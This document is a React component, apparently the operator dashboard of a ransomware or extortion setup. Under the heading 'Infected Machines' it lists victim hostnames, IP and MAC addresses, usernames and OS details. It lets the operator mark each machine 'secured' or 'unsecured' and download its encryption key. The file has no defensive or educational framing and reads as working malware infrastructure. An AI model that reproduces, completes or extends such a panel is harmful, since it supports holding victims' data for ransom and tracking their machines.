//KeyList.jsx

import { useState, useEffect } from 'react';
import { fetchAllKeys, updateKeyState, downloadKey } from '../services/KeyService';
import 'bootstrap/dist/css/bootstrap.min.css';
import '../styles/KeyList.css';

const KeyList = () => {
  const [keys, setKeys] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedMachine, setSelectedMachine] = useState(null);

  useEffect(() => {
    const getKeys = async () => {
      try {
        console.log("Fetching keys...");
        const data = await fetchAllKeys();
        console.log("Keys received:", data);
        setKeys(data);
        setLoading(false);
      } catch (err) {
        console.error("Error details:", err);
        setError('Failed to fetch encryption keys');
        setLoading(false);
      }
    };

    getKeys();
  }, []);

  const handleToggleState = async (keyId, currentState) => {
    try {
      const newState = currentState === 'secured' ? 'unsecured' : 'secured';
      const updatedKey = await updateKeyState(keyId, newState);
      
      // Update the state in the local keys array
      setKeys(keys.map(key => 
        key._id === keyId ? { ...key, state: newState } : key
      ));
    } catch (err) {
      console.error("Error updating state:", err);
      setError('Failed to update key state');
    }
  };

  const handleDownloadKey = (encryptionKey, hostname) => {
    downloadKey(encryptionKey, hostname);
  };

  const openMachineDetails = (machine) => {
    setSelectedMachine(machine);
  };

  const closeMachineDetails = () => {
    setSelectedMachine(null);
  };

  if (loading) return <div className="text-center mt-5">Loading machines...</div>;
  if (error) return <div className="alert alert-danger mt-3">{error}</div>;

  return (
    <div className="container mt-4">
      <h2>Infected Machines</h2>
      
      {keys.length === 0 ? (
        <p>No machines found</p>
      ) : (
        <div className="table-responsive">
          <table className="table table-striped">
            <thead>
              <tr>
                <th>Machine</th>
                <th>Hostname</th>
                <th>IP Address</th>
                <th>Status</th>
                <th>Download Key</th>
                <th>Machine Info.</th>
              </tr>
            </thead>
            <tbody>
              {keys.map((key, index) => (
                <tr key={key._id}>
                  <td>{index + 1}</td>
                  <td>{key.hostname || 'Unknown'}</td>
                  <td>{key.ip_address || 'Unknown'}</td>
                  <td>
                    <div className="form-check form-switch">
                      <input
                        className="form-check-input"
                        type="checkbox"
                        id={`state-${key._id}`}
                        checked={key.state === 'secured'}
                        onChange={() => handleToggleState(key._id, key.state || 'unsecured')}
                      />
                      <label className="form-check-label" htmlFor={`state-${key._id}`}>
                        {key.state === 'secured' ? 'Secured' : 'Unsecured'}
                      </label>
                    </div>
                  </td>
                  <td>
                    <button
                      className="btn btn-primary btn-sm"
                      onClick={() => handleDownloadKey(key.encryption_key, key.hostname)}
                    >
                      <i className="bi bi-download me-1"></i> Download Key
                    </button>
                  </td>
                  <td>
                    <button
                      className="btn btn-info btn-sm"
                      onClick={() => openMachineDetails(key)}
                    >
                      <i className="bi bi-person me-1"></i> {key.username || 'User Details'}
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* Machine Details Modal */}
      {selectedMachine && (
        <>
          <div className="modal-backdrop show" onClick={closeMachineDetails}></div>
          <div className="modal show d-block" tabIndex="-1">
            <div className="modal-dialog" onClick={e => e.stopPropagation()}>
              <div className="modal-content">
                <div className="modal-header">
                  <h5 className="modal-title">Machine Details</h5>
                  <button type="button" className="btn-close" onClick={closeMachineDetails}></button>
                </div>
                <div className="modal-body">
                  <ul className="list-group">
                    <li className="list-group-item">
                      <strong>MAC Address:</strong> {selectedMachine.mac_address || 'Not available'}
                    </li>
                    <li className="list-group-item">
                      <strong>OS Info:</strong> {selectedMachine.os_info || 'Not available'}
                    </li>
                    <li className="list-group-item">
                      <strong>Username:</strong> {selectedMachine.username || 'Not available'}
                    </li>
                    <li className="list-group-item">
                      <strong>Created At:</strong> {selectedMachine.sent_at || 'Not available'}
                    </li>
                  </ul>
                </div>
                <div className="modal-footer">
                  <button type="button" className="btn btn-secondary" onClick={closeMachineDetails}>Close</button>
                </div>
              </div>
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default KeyList;